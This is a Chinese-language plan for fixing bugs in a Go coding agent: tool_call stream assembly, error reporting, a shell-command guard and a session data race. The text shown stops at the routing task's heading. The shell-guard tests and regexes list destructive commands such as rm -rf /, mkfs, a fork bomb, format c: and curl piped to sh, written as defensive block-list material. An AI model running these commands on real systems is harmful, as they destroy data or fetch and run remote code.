# 关键缺陷修复 Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 修复 2026-10-07 代码审查发现的 2 个 P0 缺陷（shell 沙箱失效、流式 tool_call 参数丢失）与 5 个 P1 缺陷（错误统计失真、Session 数据竞争、路由误判、上下文无上限、工作区边界漂移），并补齐工程卫生短板。

**Architecture:** 不改动现有分层（provider / agent / channel / orchestrator / tools）。全部修复为原地增量：shell 策略与 token 估算各自独立成文件；tool_call 组装与错误传播收敛到 `helpers.go`；上下文压缩挂在 Session 上由 Orchestrator 显式调用，不塞进 Agent 内部循环。

**Tech Stack:** Go 1.26.1，go-openai v1，regexp（shell 策略），标准库 context/sync/unicode/utf8

**前置条件：** 无。基线已确认 `go build` / `go vet` / `go test` / `go test -race` 全部通过，审查用的临时测试文件已删除。

> **本计划中的关键代码已实测验证**（2026-10-07）。编写过程中发现并修正了三处初版缺陷：
> 1. `del /f /s /q C:\` 的正则用 `\\?` 只匹配得到反斜杠，漏掉 `C:/` 和 `C:`，改用 `[\\/]?` 后 19 条危险命令全部拦截、13 条正常命令全部放行。
> 2. router 的 researcher 关键词表缺 `对比/更适合` 等选型词汇，导致「对比 REST 和 gRPC」落到默认 coder。
> 3. 「review 这个 PR 的实现」这类用例本身含写入词 `实现`，按设计就该判 coder——已换成不含歧义的 `code review 一下这个提交`。
>
> 落地时建议照抄计划中的最终版本，不要回退到初版写法。

---

## 关键设计决策

### D1. shell 沙箱：黑名单常开 + 白名单可选（而非交互式审批）

审查中评估过「每次危险命令弹窗审批」。**否决**：工具执行是并发跑在 goroutine 里的（`helpers.go:120`），拿不到 readline 实例，交互式审批要么把并发退化成串行，要么引入第二套输入通道，代价远大于收益。

改为两级：
- **黑名单常开**（无需配置）：正则拦截约 30 条不可逆命令，覆盖 `rm -rf /`、`mkfs`、`dd of=/dev/sd*`、fork bomb、注册表 HKLM 删除、磁盘格式化等。
- **白名单可选**（`LM_SHELL_STRICT=1`）：只放行 git/go/npm/测试/只读命令等。

理由：黑名单保证「默认安全」，白名单给可信场景留出口，且都不破坏并发模型。

### D2. 上下文压缩挂在 Session，不进 Agent 循环

`BaseAgent.Run` 内部循环（`base.go:86`）每轮重算全量历史，若把压缩塞进去会在同一轮内反复压缩，且 Agent 不持有跨轮状态、无法缓存摘要。改为 Orchestrator 在 `Handle` 中**调 Agent 之前**压缩一次，摘要写回 Session 复用，避免每轮重新摘要。

### D3. 路由采用非对称策略：写入意图一票否决

coder 拥有全部工具，是**唯一不会因误判而让任务失败**的角色；reviewer/researcher 都是子集工具。因此判定顺序刻意不对称——只要检测到写入意图就直接归 coder，哪怕消息里同时出现「对比」「看看」（这类词本该触发 researcher/reviewer）。默认也是 coder。

反向代价：纯研究请求里含「实现」二字会被判成 coder（如「怎么实现闭包」）。这是可接受的——coder 有 `web_search`，只是少一段角色提示词，不会让任务失败。

---

## 文件变动清单

| 操作 | 文件 | 说明 |
|------|------|------|
| Modify | `.gitignore` | 加 `!docs/superpowers/` 例外，修「新计划文档被静默忽略」 |
| Modify | `pkg/agent/helpers.go` | tool_call 组装改为按 index 归位；错误正确传播 |
| Create | `pkg/agent/context.go` | token 估算 + 上下文压缩 |
| Create | `pkg/agent/context_test.go` | 上述单测 |
| Modify | `pkg/agent/helpers_test.go` | tool_call 组装 / 错误统计回归测试 |
| Create | `pkg/tools/shell_guard.go` | shell 命令黑名单 + 可选白名单 |
| Create | `pkg/tools/shell_guard_test.go` | 上述单测 |
| Modify | `pkg/tools/file.go` | `RunShell` 接入 shell_guard；补超时 |
| Modify | `pkg/tools/workspace.go` | 工作区根目录启动时固定，去掉 `os.Getwd()` 实时依赖 |
| Modify | `pkg/orchestrator/router.go` | 写入意图优先的非对称路由 |
| Modify | `pkg/orchestrator/router_test.go` | 路由用例扩充 |
| Modify | `pkg/orchestrator/session.go` | 摘要字段 + `Compact` 方法 + `lastSeen` 加锁访问 |
| Modify | `pkg/orchestrator/orchestrator.go` | evictLoop 加锁 + stop channel；调 Compact |
| Modify | `pkg/orchestrator/orchestrator_test.go` | race 回归 + compact 测试 |
| Modify | `cmd/agent/main.go` | 关闭 Orchestrator（停 evictLoop）；固定工作区根 |
| Modify | 全仓 27 个文件 | `gofmt -w` |

---

## Phase 0：工程卫生（先做，避免后续 diff 被格式化噪音淹没）

### Task 0.1: 修复 `.gitignore` 吞掉计划文档的问题

**Files:**
- Modify: `.gitignore`

- [ ] **Step 0.1.1: 确认问题**

```bash
git check-ignore -v docs/superpowers/plans/2026-03-30-self-bootstrap-restart.md
# .gitignore:37:superpowers/  docs/superpowers/plans/2026-03-30-self-bootstrap-restart.md
```

现状：`docs/superpowers/` 下 10 个文件已被追踪（早期 `git add` 绕过规则），但 2026-03-30 之后新增的 3 个计划**从未进入版本库**——包括 self-bootstrap-restart 和 web-search-exa-backend 两份实施计划。

- [ ] **Step 0.1.2: 在 `.gitignore` 末尾加例外规则**

`superpowers/` 规则是为了屏蔽仓库根目录的 `.superpowers/`，但未锚定，会连带命中 `docs/superpowers/`。把例外加在文件末尾（后置规则优先）：

```gitignore
# 仅忽略仓库根目录的 .superpowers/，保留 docs/superpowers/ 下的设计文档
!docs/superpowers/
```

- [ ] **Step 0.1.3: 验证并补追踪**

```bash
git check-ignore -v docs/superpowers/plans/2026-10-07-critical-bugs-fix.md
# 期望：无输出（未被忽略）

git add -f docs/superpowers/plans/2026-03-30-self-bootstrap-restart.md \
          docs/superpowers/plans/2026-03-30-agent-prompt-optimization.md \
          docs/superpowers/specs/2026-03-30-agent-prompt-optimization-design.md \
          docs/superpowers/specs/2026-04-19-logging-refactor-design.md
git status --short docs/
```

### Task 0.2: 全量 gofmt

**Files:** 27 个未格式化文件（`gofmt -l ./cmd ./pkg` 有输出）

- [ ] **Step 0.2.1: 格式化并确认**

```bash
gofmt -w ./cmd ./pkg
gofmt -l ./cmd ./pkg   # 期望：无输出
go build ./... && go test ./...
```

> 注意：这一步会产生较大 diff，建议**单独一个 commit**，不要和逻辑修复混在一起，便于后续 `git log` 追溯。

- [ ] **Step 0.2.2: 提交（仅格式化）**

```bash
git add -A && git commit -m "style: gofmt 全量格式化（27 个文件）"
```

### Task 0.3: 清理未提交的中间态

**Files:** `cmd/telegram/main.go`、`pkg/channel/telegram/*`、`pkg/agent/engine.go`（均已 staged 为删除）

- [ ] **Step 0.3.1: 确认删除是有意为之**

审查时这些文件处于「已 staged 删除但未提交」状态。`go.mod` 里 telegram 相关依赖也应一并移除。

- [ ] **Step 0.3.2: 验证删除后仍可构建**

```bash
go mod tidy && go build ./... && go test ./...
git diff --cached --stat
```

- [ ] **Step 0.3.3: 提交清理**

```bash
git commit -m "refactor: 移除 telegram 通道与已被 BaseAgent 取代的 engine.go"
```

---

## Phase 1：P0 缺陷（存在静默错误或安全缺口，优先修）

### Task 1.1: 修复流式 tool_call 参数丢失

**Files:**
- Modify: `pkg/agent/helpers.go:227-303`（`consumeStream`）
- Test: `pkg/agent/helpers_test.go`

**背景（已实测复现）：** 现实现假设 slice 下标 == delta `Index`。但 `helpers.go:261-263` 在 `tc.Index == nil` 时直接 `continue` 丢弃整个 tool_call delta，一旦首个 chunk 缺 index，后续所有参数错位。实测输出：

```
assembled toolCalls len=1
DROP: index 1 >= len(toolCalls)=1 -> args lost: {"path":"."}
toolCalls[0] name=list_files args=""
```

模型于是带着**空参数**去调工具，且拿不到任何错误提示。

- [ ] **Step 1.1.1: 写失败测试**

```go
// pkg/agent/helpers_test.go
package agent

import (
	"strings"
	"testing"

	"github.com/sashabaranov/go-openai"
)

// toolCallAccumulator 按 delta index 累积工具调用，避免 slice 下标错配
func TestConsumeStreamToolCallAssembly(t *testing.T) {
	intPtr := func(i int) *int { return &i }

	tests := []struct {
		name  string
		deltas []openai.ChatCompletionToolCall
		wantNames []string
		wantArgs  []string
	}{
		{
			name: "index 正常递增",
			deltas: []openai.ChatCompletionToolCall{
				{Index: intPtr(0), ID: "call_0", Function: openai.FunctionCall{Name: "read_file", Arguments: `{"path":`}},
				{Index: intPtr(0), Function: openai.FunctionCall{Arguments: `"a.go"}`}},
				{Index: intPtr(1), ID: "call_1", Function: openai.FunctionCall{Name: "list_files", Arguments: `{"path":"."}`}},
			},
			wantNames: []string{"read_file", "list_files"},
			wantArgs:  []string{`{"path":"a.go"}`, `{"path":"."}`},
		},
		{
			name: "首个 chunk 缺 index（回归：修复前会丢参数）",
			deltas: []openai.ChatCompletionToolCall{
				{Index: nil, ID: "call_0", Function: openai.FunctionCall{Name: "read_file", Arguments: `{"path":"a"}`}},
				{Index: intPtr(1), ID: "call_1", Function: openai.FunctionCall{Name: "list_files", Arguments: `{"path":"."}`}},
			},
			wantNames: []string{"read_file", "list_files"},
			wantArgs:  []string{`{"path":"a"}`, `{"path":"."}`},
		},
		{
			name: "全部缺 index（退化为到达顺序）",
			deltas: []openai.ChatCompletionToolCall{
				{Index: nil, ID: "call_0", Function: openai.FunctionCall{Name: "git_status", Arguments: `{}`}},
				{Index: nil, ID: "call_1", Function: openai.FunctionCall{Name: "git_log", Arguments: `{"n":5}`}},
			},
			wantNames: []string{"git_status", "git_log"},
			wantArgs:  []string{`{}`, `{"n":5}`},
		},
		{
			name: "ID 与 Name 在后续 chunk 才出现",
			deltas: []openai.ChatCompletionToolCall{
				{Index: intPtr(0), Function: openai.FunctionCall{Arguments: `{}`}},
				{Index: intPtr(0), ID: "call_late", Function: openai.FunctionCall{Name: "git_diff"}},
			},
			wantNames: []string{"git_diff"},
			wantArgs:  []string{`{}`},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			gotNames, gotArgs := assembleToolCallsForTest(tt.deltas)
			if len(gotNames) != len(tt.wantNames) {
				t.Fatalf("工具数量 = %d, 期望 %d (%v)", len(gotNames), len(tt.wantNames), gotNames)
			}
			for i := range gotNames {
				if gotNames[i] != tt.wantNames[i] {
					t.Errorf("[%d] name = %q, 期望 %q", i, gotNames[i], tt.wantNames[i])
				}
				if gotArgs[i] != tt.wantArgs[i] {
					t.Errorf("[%d] args = %q, 期望 %q", i, gotArgs[i], tt.wantArgs[i])
				}
			}
		})
	}
}
```

同时把组装逻辑抽成可测的纯函数（见 Step 1.1.2），测试通过 `assembleToolCallsForTest` 调用它。

- [ ] **Step 1.1.2: 重写组装逻辑**

在 `helpers.go` 中新增累积器类型，并替换 `consumeStream` 的两处组装代码：

```go
// toolCallAccumulator 按 delta index 累积单个工具调用的分片字段。
// 不能用 slice 下标代替 index：部分 provider 首个 chunk 不带 index，
// 用下标会导致参数与调用错位甚至被静默丢弃。
type toolCallAccumulator struct {
	call openai.ToolCall
	args strings.Builder
}

// assembleToolCalls 按到达顺序返回工具调用。
// idx 为 nil 时退化为「下一个到达位置」，保证参数不丢。
func assembleToolCalls(deltas []openai.ChatCompletionToolCall) []openai.ToolCall {
	accumulators := make(map[int]*toolCallAccumulator)
	order := make([]int, 0, len(deltas))

	for _, tc := range deltas {
		idx := len(order)
		if tc.Index != nil {
			idx = *tc.Index
		}

		acc, ok := accumulators[idx]
		if !ok {
			acc = &toolCallAccumulator{call: openai.ToolCall{
				ID:       tc.ID,
				Type:     tc.ToolType,
				Function: openai.FunctionCall{Name: tc.Function.Name},
			}}
			accumulators[idx] = acc
			order = append(order, idx)
		}

		// 后续 chunk 可能补齐首块缺失的字段
		if tc.ID != "" {
			acc.call.ID = tc.ID
		}
		if tc.Function.Name != "" {
			acc.call.Function.Name = tc.Function.Name
		}
		if tc.Function.Arguments != "" {
			acc.args.WriteString(tc.Function.Arguments)
		}
	}

	toolCalls := make([]openai.ToolCall, 0, len(order))
	for _, idx := range order {
		call := accumulators[idx].call
		call.Function.Arguments = accumulators[idx].args.String()
		toolCalls = append(toolCalls, call)
	}
	return toolCalls
}
```

然后把 `consumeStream` 里的收集与组装替换为：

```go
		// 处理工具调用：收集所有分片，最后统一组装
		toolCallDeltas = append(toolCallDeltas, delta.ToolCalls...)
```

并在流结束后：

```go
	// 组装最终的 tool calls（按 index 归位，不依赖 slice 下标）
	toolCalls = assembleToolCalls(toolCallDeltas)
```

删除原先的 `toolCallsDelta` map 与 `for idx, builder := range toolCallsDelta` 循环。

- [ ] **Step 1.1.3: 运行测试**

```bash
go test ./pkg/agent -run TestConsumeStreamToolCallAssembly -v
go test ./pkg/agent -race
```

### Task 1.2: 修复工具失败被统计为成功

**Files:**
- Modify: `pkg/agent/helpers.go:74-99`（`executeToolCall`）、`142-148`、`192-215`（`displayToolCallsResults`）

**背景（已实测复现）：** `executeToolCall` 把错误编码进 `resultStr` 字符串并返回 `err == nil`，而 `displayToolCallsResults` 只看 `r.err`。实测失败场景显示 `success=1 failed=0`，UI 摘要「完成: N 成功」几乎永远全绿，无法作为可信信号。

- [ ] **Step 1.2.1: 写失败测试**

```go
// pkg/agent/helpers_test.go
func TestExecuteToolCallPropagatesError(t *testing.T) {
	tools.Executors["test_zz_fail"] = func(args interface{}) (interface{}, error) {
		return "部分输出", errors.New("boom")
	}
	tools.Executors["test_zz_badjson"] = func(args interface{}) (interface{}, error) {
		return nil, errors.New("invalid character 'i' looking for beginning of object key")
	}
	t.Cleanup(func() {
		delete(tools.Executors, "test_zz_fail")
		delete(tools.Executors, "test_zz_badjson")
	})

	a := &BaseAgent{maxConcurrency: 1}

	for _, name := range []string{"test_zz_fail", "test_zz_badjson"} {
		res := a.executeToolCallsConcurrently(t.Context(), []openai.ToolCall{{
			ID:       "call_" + name,
			Function: openai.FunctionCall{Name: name, Arguments: `{}`},
		}})
		if len(res) != 1 {
			t.Fatalf("期望 1 个结果, 得到 %d", len(res))
		}
		if res[0].err == nil {
			t.Errorf("%s: err = nil, 期望非 nil（错误必须能被上层统计到）", name)
		}
		if !strings.Contains(res[0].resultStr, "错误") {
			t.Errorf("%s: resultStr = %q, 期望包含「错误」", name, res[0].resultStr)
		}
	}

	// 未知工具也必须报错
	res := a.executeToolCallsConcurrently(t.Context(), []openai.ToolCall{{
		ID:       "call_unknown",
		Function: openai.FunctionCall{Name: "test_zz_nonexistent", Arguments: `{}`},
	}})
	if res[0].err == nil {
		t.Error("未知工具: err = nil, 期望非 nil")
	}
}
```

- [ ] **Step 1.2.2: 让 `executeToolCall` 返回 error**

```go
// executeToolCall 执行单个工具调用。
// 返回的 error 必须非 nil 当且仅当工具执行失败——UI 统计依赖该字段，
// 不能只把错误写进结果字符串。
func (a *BaseAgent) executeToolCall(toolCall openai.ToolCall) (string, error) {
	executor := tools.Executors[toolCall.Function.Name]
	if executor == nil {
		return fmt.Sprintf("错误: 未知工具 %s", toolCall.Function.Name),
			fmt.Errorf("未知工具 %s", toolCall.Function.Name)
	}

	result, err := executor(toolCall.Function.Arguments)
	output, _ := result.(string)

	if err != nil {
		if output != "" {
			return fmt.Sprintf("输出: %s\n错误: %s", output, err),
				fmt.Errorf("%w", err)
		}
		return fmt.Sprintf("错误: %s", err), fmt.Errorf("%w", err)
	}

	if output != "" {
		return output, nil
	}
	if result == nil {
		return "", nil
	}
	return fmt.Sprintf("%v", result), nil
}
```

- [ ] **Step 1.2.3: 修正并发执行处的 err 赋值**

`helpers.go` 的 `executeToolCallsConcurrently` 中，原本只填 `resultStr`、把 `err` 留空。改为：

```go
			// 执行工具调用
			resultStr, execErr := a.executeToolCall(toolCall)
			results[index] = toolCallResult{
				index:      index,
				toolCallID: toolCall.ID,
				toolName:   toolCall.Function.Name,
				resultStr:  resultStr,
				err:        execErr,
			}
```

- [ ] **Step 1.2.4: 摘要行同时报告真实失败数**

`displayToolCallsResults` 末尾的摘要改为在有失败时明确标出：

```go
	// 显示摘要
	if failed > 0 {
		ui.PrintError("  完成: %d 成功, %d 失败", success, failed)
		return
	}
	ui.PrintDim("  完成: %d 成功", success)
```

- [ ] **Step 1.2.5: 运行测试**

```bash
go test ./pkg/agent -run TestExecuteToolCallPropagatesError -v
go test ./pkg/agent -race
```

### Task 1.3: 给 run_shell 加沙箱策略

> **⚠️ 本节已被取代（2026-10-21）**：本 Task 当时的做法是「命令黑名单/白名单」，
> 它只防误操作、不构成文件边界。真正的分层加固见
> `docs/superpowers/plans/2026-10-07-sandbox-hardening.md`
> （L1 路径边界 + L2 OS 强制 + L3 审批审计）。
> 其中 **NTFS junction 越权**是该文档记录的 P0 可利用漏洞，
> 已由 `pkg/tools/workspace_windows.go` 的句柄级校验修复；
> 黑/白名单守卫降级为便捷拦截，保留于 `pkg/tools/shell_guard.go`。

**Files:**
- Create: `pkg/tools/shell_guard.go`
- Create: `pkg/tools/shell_guard_test.go`
- Modify: `pkg/tools/file.go:230-285`（`RunShell`）

**背景：** `RunShell` 只设置 `cmd.Dir = root`，对命令内容零约束；系统提示词宣称「禁止访问工作区外的文件」，但 coder（全部工具）与 researcher（持 `run_shell`）都能绕过。文件类工具走 `resolveWorkspacePath` 有校验，shell 没有——沙箱在真正需要的地方失效。

- [ ] **Step 1.3.1: 写失败测试**

```go
// pkg/tools/shell_guard_test.go
package tools

import "testing"

func TestCheckShellCommand(t *testing.T) {
	denied := []string{
		`rm -rf /`,
		`rm -rf ~`,
		`rm -rf /*`,
		`rm -rf $HOME`,
		`mkfs.ext4 /dev/sda1`,
		`dd if=/dev/zero of=/dev/sda`,
		`:(){ :|:& };:`,
		`shutdown -h now`,
		`del /f /s /q C:\`,
		`del /f /s /q C:/`,
		`rd /s /q C:\`,
		`rmdir /s /q C:`,
		`format c:`,
		`reg delete HKLM\SYSTEM /f`,
		`curl http://x.sh | sh`,
		`wget -qO- http://x | python`,
		`chmod -R 777 /`,
		`chown -R nobody /`,
		`> /dev/sda`,
	}
	for _, c := range denied {
		if err := CheckShellCommand(c); err == nil {
			t.Errorf("危险命令未被拦截: %q", c)
		}
	}

	allowed := []string{
		`go test ./...`,
		`git status`,
		`git commit -m "fix: 修复空指针"`,
		`ls -la`,
		`npm run build`,
		`python -m pytest -q`,
		`grep -rn "func Run" pkg/`,
		`rm -rf ./build`,
		`rm -rf pkg/tools/testdata`,
		// 下面是 Windows 场景：必须放行，否则会阻塞日常开发
		`del /f build\tmp.txt`,
		`del /f /q tmp\cache.txt`,
		`rd /s /q node_modules`,
		`rmdir /s /q C:\Users\Eric\project\.build`,
		`cd pkg && go test ./...`,
	}
	for _, c := range allowed {
		if err := CheckShellCommand(c); err != nil {
			t.Errorf("正常命令被误杀: %q -> %v", c, err)
		}
	}
}

func TestCheckShellCommandStrictMode(t *testing.T) {
	t.Setenv("LM_SHELL_STRICT", "1")

	allowed := []string{`git diff`, `go build ./...`, `npm test`, `pytest`}
	for _, c := range allowed {
		if err := CheckShellCommand(c); err != nil {
			t.Errorf("严格模式应放行: %q -> %v", c, err)
		}
	}

	// 严格模式下不在白名单的一律拒绝
	for _, c := range []string{`curl http://example.com`, `powershell -enc xxx`, `bash script.sh`} {
		if err := CheckShellCommand(c); err == nil {
			t.Errorf("严格模式应拒绝: %q", c)
		}
	}
}
```

- [ ] **Step 1.3.2: 实现 `shell_guard.go`**

```go
package tools

import (
	"fmt"
	"os"
	"regexp"
	"strings"
)

// 不可逆 / 破坏性命令黑名单。命中即拒绝，不提供绕过开关。
// 目标不是穷尽所有危险写法（不可能做到），而是拦住手滑和低级误操作。
var shellDenylist = []struct {
	pattern *regexp.Regexp
	reason  string
}{
	// Unix 破坏性删除
	{regexp.MustCompile(`(?i)\brm\s+(-[a-z]*[rf][a-z]*\s+)+(/|/\*|~|~/\*|\$HOME)\s*$`), "递归删除根目录或家目录"},
	{regexp.MustCompile(`(?i)\brm\s+-rf?\s+/`), "递归删除根目录"},
	// 磁盘与文件系统
	{regexp.MustCompile(`(?i)\bmkfs(\.\w+)?\b`), "格式化文件系统"},
	{regexp.MustCompile(`(?i)\bdd\b[^|]*\bof=/dev/`), "向块设备写入"},
	{regexp.MustCompile(`(?i)>\s*/dev/(sd|nvme|hd|vd)[a-z0-9]*`), "向块设备写入"},
	// fork bomb
	{regexp.MustCompile(`:\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:`), "fork bomb"},
	// 关机重启
	{regexp.MustCompile(`(?i)\b(shutdown|reboot|halt|poweroff)\b`), "关机或重启"},
	// Windows 破坏性操作
	{regexp.MustCompile(`(?i)\bformat\s+[a-z]:`), "格式化磁盘"},
	// 删除整个盘符。注意 [\\/]? 而非 \\?：后者只能匹配 `C:\`，漏掉 `C:/` 和 `C:`
	{regexp.MustCompile(`(?i)\b(del|rd|rmdir|removedir)\b[^|]*\b[a-z]:[\\/]?\s*$`), "删除整个盘符根目录"},
	// 注册表与系统配置
	{regexp.MustCompile(`(?i)reg\s+delete\s+HK(LM|CRU)`), "删除注册表机器/用户级键"},
	// 权限与资源
	{regexp.MustCompile(`(?i)\bchmod\s+-R\s+[0-7]*7[0-7]*\s+/`), "递归开放根目录权限"},
	{regexp.MustCompile(`(?i)\bchown\s+-R\b.*\s+/`), "递归修改根目录属主"},
	// 管道执行远程脚本
	{regexp.MustCompile(`(?i)\b(curl|wget)\b[^|]*\|\s*(sudo\s+)?(ba)?sh`), "管道执行远程脚本"},
	{regexp.MustCompile(`(?i)\b(curl|wget)\b[^|]*\|\s*(sudo\s+)?(python|perl|ruby)\b`), "管道执行远程脚本"},
	// fork 炸弹式进程创建
	{regexp.MustCompile(`(?i)\bwhile\s+true\s*;?\s*do\b.*\bmkdir\b`), "疑似无限循环创建目录"},
}

// 严格模式白名单：命令的第一个词必须命中其一。
var shellAllowlist = map[string]bool{
	"git": true, "go": true, "gofmt": true, "goimports": true,
	"npm": true, "npx": true, "node": true, "pnpm": true, "yarn": true,
	"python": true, "python3": true, "pip": true, "pytest": true,
	"cargo": true, "rustc": true, "make": true, "cmake": true,
	"mvn": true, "gradle": true, "dotnet": true, "java": true,
	"ls": true, "dir": true, "cat": true, "type": true, "head": true, "tail": true,
	"wc": true, "grep": true, "rg": true, "find": true, "fd": true,
	"echo": true, "pwd": true, "cd": true, "sort": true, "uniq": true,
	"diff": true, "jq": true, "sed": true, "awk": true, "tree": true,
	"which": true, "where": true, "whoami": true, "date": true, "env": true,
}

// CheckShellCommand 校验命令是否允许执行。
// 默认仅拦截黑名单中的破坏性命令；设置 LM_SHELL_STRICT=1 后改为白名单模式。
func CheckShellCommand(command string) error {
	normalized := strings.TrimSpace(command)
	if normalized == "" {
		return fmt.Errorf("命令为空")
	}

	// 展开行尾续行符，避免用 `\` 拆开绕过匹配
	normalized = strings.ReplaceAll(normalized, "\\\r\n", " ")
	normalized = strings.ReplaceAll(normalized, "\\\n", " ")
	lower := strings.ToLower(normalized)

	for _, entry := range shellDenylist {
		if entry.pattern.MatchString(lower) || entry.pattern.MatchString(normalized) {
			return fmt.Errorf("命令被安全策略拒绝（%s）。如确需执行，请手动在终端运行。\n被拒绝的命令: %s",
				entry.reason, normalized)
		}
	}

	if os.Getenv("LM_SHELL_STRICT") == "1" {
		if !shellCommandAllowed(lower) {
			return fmt.Errorf("严格模式（LM_SHELL_STRICT=1）下只允许白名单命令，被拒绝: %s", normalized)
		}
	}

	return nil
}

// shellCommandAllowed 判断命令首词是否在白名单内。
func shellCommandAllowed(lower string) bool {
	fields := strings.Fields(lower)
	if len(fields) == 0 {
		return false
	}
	// 跳过 cd 这类环境切换，允许 `cd x && go test` 这类组合
	for _, f := range fields {
		if shellAllowlist[f] {
			return true
		}
		if f == "&&" || f == "||" || f == ";" || f == "|" {
			continue
		}
	}
	return false
}
```

- [ ] **Step 1.3.3: 接入 `RunShell` 并补超时**

`pkg/tools/file.go` 的 `RunShell` 中，在 `workspaceRoot()` 之后立刻插入策略校验；并为执行加超时（当前 `RunShell` 无超时，`download`/`web_search` 都有）：

```go
func RunShell(args interface{}) (interface{}, error) {
	var params RunShellArguments
	if err := parseArgs(args, &params); err != nil {
		return nil, err
	}

	command := strings.TrimSpace(params.Command)
	if result, handled, err := handleRestartCommand(command); handled {
		if result == "" && err == nil {
			return "", fmt.Errorf("重启处理器未初始化")
		}
		return result, err
	}

	// 安全策略：黑名单常开，严格模式可选
	if err := CheckShellCommand(command); err != nil {
		return nil, err
	}

	root, err := workspaceRoot()
	if err != nil {
		return nil, err
	}

	// 超时保护：防止模型写出长驻命令卡死整个会话
	timeout := shellTimeout()
	runCtx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	options := cmd.Options{
		Buffered:       true,
		CombinedOutput: false,
		BeforeExec: []func(*exec.Cmd){
			func(execCmd *exec.Cmd) {
				execCmd.Dir = root
				execCmd.Cancel = runCtx.Done
			},
		},
	}
	// …（后续启动逻辑不变）
}

// shellTimeout 返回命令执行超时，默认 120 秒，可用 LM_SHELL_TIMEOUT 覆盖（秒）。
func shellTimeout() time.Duration {
	if v := os.Getenv("LM_SHELL_TIMEOUT"); v != "" {
		if secs, err := strconv.Atoi(v); err == nil && secs > 0 {
			return time.Duration(secs) * time.Second
		}
	}
	return 120 * time.Second
}
```

需补 import：`context`、`strconv`、`time`。

- [ ] **Step 1.3.4: 同步更新系统提示词，如实描述边界**

`pkg/agent/prompt.go` 目前写「所有文件路径必须是工作区内的相对路径，禁止访问工作区外的文件」。这句对 `run_shell` 是**不成立的**——shell 能访问工作区外文件。改为如实说明：

```go
## 文件与命令边界
- 文件操作工具（read_file/write_file 等）只能访问工作区内的相对路径。
- run_shell 是可信工具：它以工作区为工作目录，但**能访问工作区之外的任何文件**。
  仅在确有需要时使用，不要把 shell 当作绕过路径限制的手段。
- 不要在用户未明确授权时，对工作区外的路径执行读写或删除。
```

- [ ] **Step 1.3.5: 运行测试**

```bash
go test ./pkg/tools -run TestCheckShellCommand -v
go test ./... && go vet ./...
```

---

## Phase 2：P1 缺陷（稳定性与可用性）

### Task 2.1: 修复 Session 数据竞争与 goroutine 泄漏

**Files:**
- Modify: `pkg/orchestrator/orchestrator.go:154-167`（`evictLoop`）、`42-48`（结构体）、`51-59`（`New`）
- Modify: `pkg/orchestrator/session.go`（`lastSeen` 访问器）
- Test: `pkg/orchestrator/orchestrator_test.go`

**背景（`-race` 实测复现）：** `evictLoop` 在 `orchestrator.go:161` 无锁读 `s.lastSeen`，与 `AppendUserMessage`（`session.go:67`）的写并发：

```
WARNING: DATA RACE
Write at 0x00c0001582e0 by goroutine 11:
  mini-code/pkg/orchestrator.(*Session).AppendUserMessage()
      session.go:67
Previous read at 0x00c0001582e0 by goroutine 14:
```

此外 `New()` 里 `go o.evictLoop()` 无退出途径，goroutine 随进程存活永久泄漏，测试中也无法回收。

- [ ] **Step 2.1.1: 写失败测试**

```go
// pkg/orchestrator/orchestrator_test.go
func TestOrchestrator_EvictLoopRaceAndShutdown(t *testing.T) {
	o := orchestrator.New(nil)
	s := o.GetOrCreateSession("cli", "local")

	// 并发写 lastSeen，evictLoop 同时无锁读会触发 race
	var wg sync.WaitGroup
	for w := 0; w < 4; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for i := 0; i < 300; i++ {
				s.AppendUserMessage("hi")
			}
		}()
	}
	wg.Wait()

	// Close 必须可重复调用且不阻塞
	done := make(chan struct{})
	go func() {
		o.Close()
		close(done)
	}()
	select {
	case <-done:
	case <-time.After(2 * time.Second):
		t.Fatal("Close() 超时，evictLoop 可能未退出")
	}
	o.Close() // 幂等
}
```

> 注：该测试需在 `orchestrator` 包**内部**（`package orchestrator`）以访问未导出字段，或改为导出 `Close()` 后用 `_test` 包。当前测试文件是 `package orchestrator_test`，需新建 `evict_test.go`（`package orchestrator`）。

- [ ] **Step 2.1.2: 给 `lastSeen` 加锁访问器**

`pkg/orchestrator/session.go` 新增：

```go
// LastSeen 返回最后活跃时间（加锁访问）。
func (s *Session) LastSeen() time.Time {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.lastSeen
}
```

- [ ] **Step 2.1.3: `evictLoop` 加锁 + 可退出**

```go
// evictLoop 每小时清理超过 24h 不活跃的 Session
func (o *Orchestrator) evictLoop() {
	ticker := time.NewTicker(time.Hour)
	defer ticker.Stop()
	for {
		select {
		case <-o.stopCh:
			return
		case <-ticker.C:
			o.evictStaleSessions()
		}
	}
}

// evictStaleSessions 清理过期 Session。
// 注意：读 s.lastSeen 必须走加锁的 LastSeen()，直接访问字段会与
// AppendUserMessage 的写产生数据竞争。
func (o *Orchestrator) evictStaleSessions() {
	const staleAfter = 24 * time.Hour

	o.mu.Lock()
	defer o.mu.Unlock()

	for key, s := range o.sessions {
		if time.Since(s.LastSeen()) > staleAfter {
			delete(o.sessions, key)
		}
	}
}
```

结构体与构造函数增加 `stopCh`：

```go
type Orchestrator struct {
	sessions map[string]*Session
	mu       sync.Mutex
	memStore *memory.Store
	router   *Router
	restart  RestartRuntime

	stopCh   chan struct{}
	closeOnce sync.Once
}

func New(memStore *memory.Store) *Orchestrator {
	o := &Orchestrator{
		sessions: make(map[string]*Session),
		memStore: memStore,
		router:   NewRouter(),
		stopCh:   make(chan struct{}),
	}
	go o.evictLoop()
	return o
}

// Close 停止后台 goroutine。幂等，可重复调用。
func (o *Orchestrator) Close() {
	o.closeOnce.Do(func() {
		close(o.stopCh)
	})
}
```

- [ ] **Step 2.1.4: 在 `main.go` 中调用 `Close`**

`cmd/agent/main.go` 的 `runWorker` 中，`orch := orchestrator.New(memStore)` 之后加 `defer orch.Close()`。

- [ ] **Step 2.1.5: 运行测试**

```bash
go test ./pkg/orchestrator -race -v -run "TestOrchestrator"
go test -race ./...
```

> 验收标准：`-race` 下不再出现 `orchestrator` 包的 DATA RACE 警告。

### Task 2.2: 修复路由误判

**Files:**
- Modify: `pkg/orchestrator/router.go`
- Modify: `pkg/orchestrator/router_test.go`

